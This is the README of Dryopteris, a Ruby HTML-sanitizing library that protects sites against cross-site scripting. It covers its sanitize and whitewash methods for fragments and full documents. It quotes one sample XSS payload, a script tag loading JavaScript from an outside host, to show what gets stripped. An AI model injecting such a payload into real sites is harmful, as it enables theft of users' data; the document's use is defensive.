Dryopteris
==========

Dryopteris erythrosora is the Japanese Shield Fern. It also can be used to sanitize HTML to help prevent XSS attacks.

* [Dryopteris erythrosora](http://en.wikipedia.org/wiki/Dryopteris_erythrosora)
* [XSS Attacks](http://en.wikipedia.org/wiki/Cross-site_scripting)

Usage
-----

Let's say you run a web site, and you allow people to post HTML snippets.

Let's also say some script-kiddie from Norland posts this to your site, in an effort to swipe some credit cards:

    <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>

Oooh, that could be bad. Here's how to fix it:

    safe_html_snippet = Dryopteris.sanitize(dangerous_html_snippet)

Yeah, it's that easy.

In this example, <tt>safe\_html\_snippet</tt> will have all of its __broken markup fixed__ by libxml2, and it will also be completely __sanitized of harmful tags and attributes__. That's twice as clean!


Sanitization Usage
-----

You're still here? Ok, let me tell you a little something about the two different methods of sanitizing the Dryopteris offers.

### Fragments

The first method is for _html fragments_, which are small snippets of markup such as those used in forum posts, emails and homework assignments.

Usage is the same as above:

    safe_html_snippet = Dryopteris.sanitize(dangerous_html_snippet)

Generally speaking, unless you expect to have &lt;html&gt; and &lt;body&gt; tags in your HTML, this is the sanitizing method to use.

The only real limitation on this method is that the snippet must be a string object. (Support for IO objects was sacrificed at the altar of fixer-uppery-ness. If you need to sanitize data that's coming from an IO object, either socket or file, check out the next section on __Documents__).

### Documents

Sometimes you need to sanitize an entire HTML document. (Well, maybe not _you_, but other people, certainly.)

    safe_html_document = Dryopteris.sanitize_document(dangerous_html_document)

The returned string will contain exactly one (1) well-formed HTML document, with all broken HTML fixed and all harmful tags and attributes removed.

Coolness: <tt>dangerous\_html\_document</tt> can be a string OR an IO object (a file, or a socket, or ...). Which makes it particularly easy to sanitize large numbers of docs.

Whitewashing Usage
-----

### Whitewashing Fragments

Other times, you may want to remove all styling, attributes and invalid HTML tags. I like to call this "whitewashing", since it's putting a new layer of paint on top of the HTML input to make it look nice.

One use case for this feature is to clean up HTML that was cut-and-pasted from Microsoft(tm) Word into a WYSIWYG editor/textarea. Microsoft's editor is famous for injecting all kinds of cruft into its HTML output. Who needs that? Certainly not me.

    whitewashed_html = Dryopteris.whitewash(ugly_microsoft_html_snippet)

Please note that whitewashing implicitly also sanitizes your HTML, as it uses the same HTML tag whitelist as <tt>sanitize()</tt>. It's implementation is:

 1. unless the tag is on the whitelist, remove it from the document
 2. if the tag has an XML namespace on it, remove it from the document
 2. remove all attributes from the node

### Whitewashing Documents

Also note the existence of <tt>whitewash\_document</tt>, which is analogous to <tt>sanitize\_document</tt>.

Standing on the Shoulders of Giants
-----

Dryopteris uses [Nokogiri](http://nokogiri.rubyforge.org/) and [libxml2](http://xmlsoft.org/), so it's fast.

Dryopteris also takes its tag and tag attribute whitelists and its CSS sanitizer directly from [HTML5](http://code.google.com/p/html5lib/).


Authors
-----
* [Bryan Helmkamp](http://www.brynary.com/)
* [Mike Dalessio](http://mike.daless.io/) ([twitter](http://twitter.com/flavorjones))


Quotes About Dryopteris
-----

> "dryopteris shields you from xss attacks using nokogiri and NY attitude"
>  - [hasmanyjosh](http://blog.hasmanythrough.com/)

> "I just wanted to say thank you for your dryopteris plugin. It is by far the best sanitization I've found."
>  - [catalystmediastudios](http://github.com/catalystmediastudios)

